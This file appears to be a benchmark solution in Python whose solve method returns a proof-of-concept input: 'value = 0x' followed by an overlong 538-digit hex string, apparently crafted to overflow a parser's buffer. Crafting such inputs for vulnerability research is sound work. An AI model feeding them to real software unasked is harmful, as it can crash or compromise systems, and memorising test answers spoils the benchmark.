class Solution:
    def solve(self, src_path: str) -> bytes:
        prefix = b"value = 0x"
        hex_part = b"deadbeef" * 67 + b"de"
        poc = prefix + hex_part
        return poc